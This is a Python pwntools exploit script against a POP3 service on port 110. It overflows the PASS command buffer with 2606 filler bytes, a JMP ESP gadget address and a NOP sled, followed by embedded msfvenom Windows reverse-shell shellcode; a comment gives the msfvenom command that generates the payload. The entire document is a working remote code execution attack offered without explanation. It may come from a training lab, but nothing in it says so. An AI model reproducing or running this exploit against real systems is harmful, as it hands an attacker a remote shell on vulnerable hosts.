
from pwn import *

ip="192.168.0.243"
port=110

p = remote(ip,port)

#context.log_level = "debug"

buf =  b""
buf += b"\xd9\xc0\xbd\xb8\x9d\x17\xeb\xd9\x74\x24\xf4\x5a"
buf += b"\x31\xc9\xb1\x52\x31\x6a\x17\x83\xc2\x04\x03\xd2"
buf += b"\x8e\xf5\x1e\xde\x59\x7b\xe0\x1e\x9a\x1c\x68\xfb"
buf += b"\xab\x1c\x0e\x88\x9c\xac\x44\xdc\x10\x46\x08\xf4"
buf += b"\xa3\x2a\x85\xfb\x04\x80\xf3\x32\x94\xb9\xc0\x55"
buf += b"\x16\xc0\x14\xb5\x27\x0b\x69\xb4\x60\x76\x80\xe4"
buf += b"\x39\xfc\x37\x18\x4d\x48\x84\x93\x1d\x5c\x8c\x40"
buf += b"\xd5\x5f\xbd\xd7\x6d\x06\x1d\xd6\xa2\x32\x14\xc0"
buf += b"\xa7\x7f\xee\x7b\x13\x0b\xf1\xad\x6d\xf4\x5e\x90"
buf += b"\x41\x07\x9e\xd5\x66\xf8\xd5\x2f\x95\x85\xed\xf4"
buf += b"\xe7\x51\x7b\xee\x40\x11\xdb\xca\x71\xf6\xba\x99"
buf += b"\x7e\xb3\xc9\xc5\x62\x42\x1d\x7e\x9e\xcf\xa0\x50"
buf += b"\x16\x8b\x86\x74\x72\x4f\xa6\x2d\xde\x3e\xd7\x2d"
buf += b"\x81\x9f\x7d\x26\x2c\xcb\x0f\x65\x39\x38\x22\x95"
buf += b"\xb9\x56\x35\xe6\x8b\xf9\xed\x60\xa0\x72\x28\x77"
buf += b"\xc7\xa8\x8c\xe7\x36\x53\xed\x2e\xfd\x07\xbd\x58"
buf += b"\xd4\x27\x56\x98\xd9\xfd\xf9\xc8\x75\xae\xb9\xb8"
buf += b"\x35\x1e\x52\xd2\xb9\x41\x42\xdd\x13\xea\xe9\x24"
buf += b"\xf4\xd5\x46\x26\x2f\xbe\x94\x26\x2e\x85\x10\xc0"
buf += b"\x5a\xe9\x74\x5b\xf3\x90\xdc\x17\x62\x5c\xcb\x52"
buf += b"\xa4\xd6\xf8\xa3\x6b\x1f\x74\xb7\x1c\xef\xc3\xe5"
buf += b"\x8b\xf0\xf9\x81\x50\x62\x66\x51\x1e\x9f\x31\x06"
buf += b"\x77\x51\x48\xc2\x65\xc8\xe2\xf0\x77\x8c\xcd\xb0"
buf += b"\xa3\x6d\xd3\x39\x21\xc9\xf7\x29\xff\xd2\xb3\x1d"
buf += b"\xaf\x84\x6d\xcb\x09\x7f\xdc\xa5\xc3\x2c\xb6\x21"
buf += b"\x95\x1e\x09\x37\x9a\x4a\xff\xd7\x2b\x23\x46\xe8"
buf += b"\x84\xa3\x4e\x91\xf8\x53\xb0\x48\xb9\x64\xfb\xd0"
buf += b"\xe8\xec\xa2\x81\xa8\x70\x55\x7c\xee\x8c\xd6\x74"
buf += b"\x8f\x6a\xc6\xfd\x8a\x37\x40\xee\xe6\x28\x25\x10"
buf += b"\x54\x48\x6c"

#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST={Attacker IP} LPORT={Liverse_Shell_PORT} -f python -b "\x00\x0a\x0d" -o shellcode


buffer = b"\x41" * 2606 # Buffer Size : 2605
NOP = b"\x90" * 16 #NOPSLED 

gadget = 0x5F4A358F #JUMP_ESP : 0x5F4A358F
exploit = buffer + p32(gadget) + NOP + buf

print("Remote Response : " + p.recvline().decode())
p.send(b"USER Attacker " + b'\r\n')
print("Remote Response : " +p.recvline().decode())

print("..Send Payload..")
p.send(b"PASS " + exploit + b'\r\n')
      # "A"*OFFSET + JUMP_ESP + NOP_SLED + SHELLCODE
